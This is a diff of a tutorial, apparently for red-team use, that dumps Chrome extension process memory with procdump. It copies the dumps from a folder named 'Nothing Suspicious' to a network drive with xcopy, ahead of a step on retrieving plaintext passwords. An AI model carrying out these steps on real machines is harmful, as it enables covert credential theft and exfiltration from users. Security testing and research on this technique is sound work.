@@ -31,7 +31,7 @@ We are going to use wmic to get the process IDs of the running chrome extension 
 
 The output will be some .dmp files that you should copy to your Host computer. You can use xcopy, robocopy, or whatever command you'd like to copy the file to a network location. I'm going to give an example where we ran procdump in an empty folder called "Nothing Suspicious" in the ProgramData directory:
 
-    xcopy "C:\ProgramData\Google Chrome" [Network Drive Path] /s /e
+    xcopy "C:\ProgramData\Nothing Suspicious" [Network Drive Path] /s /e
 
 
 ## Step 3: Analyze Memory Dump to Retrieve Plaintext Passwords
